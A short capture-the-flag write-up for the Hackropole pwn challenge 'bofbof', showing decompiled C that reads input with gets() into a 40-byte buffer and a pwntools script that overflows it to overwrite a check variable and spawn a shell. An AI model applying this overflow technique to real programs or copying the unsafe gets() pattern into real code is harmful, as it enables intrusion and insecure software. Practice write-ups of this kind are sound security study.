+++
date = '2026-03-26T08:28:56+01:00'
draft = false
title = 'Bofbof'
+++

## Attachments

<a href="/ctf/hackropole/pwn/bofbof/bofbof">bofbof</a>
<a href="/ctf/hackropole/pwn/bofbof/solve.py">solve.py</a>
<a href="/ctf/hackropole/pwn/bofbof/docker-compose.yml">docker-compose.yml</a><br><br>

## Reverse

```C

undefined8 main(void)

{
  char local_38 [40];
  long local_10;
  
  local_10 = 0x4141414141414141;
  printf("Comment est votre blanquette ?\n>>> ");
  fflush(stdout);
  gets(local_38);
  if (local_10 != 0x4141414141414141) {
    if (local_10 == 0x1122334455667788) {
      vuln();
    }
    puts("Almost there!");
  }
  return 0;
}


void vuln(void)

{
  system("/bin/sh");
                    /* WARNING: Subroutine does not return */
  exit(1);
}

```

We just need to change the local variable 'local_10' to trigger the vuln

## Solve

```python
from pwn import *

io = process("./bofbof")

io.sendline(b"\x88\x77\x66\x55\x44\x33\x22\x11"*9)

io.interactive()
```

Thx.

Sk4r.